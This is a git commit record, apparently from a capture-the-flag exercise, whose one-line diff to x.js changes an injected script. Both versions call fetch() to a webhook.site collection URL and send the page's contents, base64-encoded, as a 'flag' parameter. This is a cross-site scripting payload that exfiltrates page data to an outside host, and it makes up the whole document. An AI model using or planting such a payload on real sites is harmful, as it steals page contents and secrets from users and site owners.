46c7cb110f96cee923d5b0b82adee200461be05e
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-16 12:15:46 +0100

    Update fetch to use document.body.innerText

--- x.js
+++ x.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag=' + btoa(document.documentElement.innerHTML));
+fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+btoa(unescape(encodeURIComponent(document.body.innerText))));
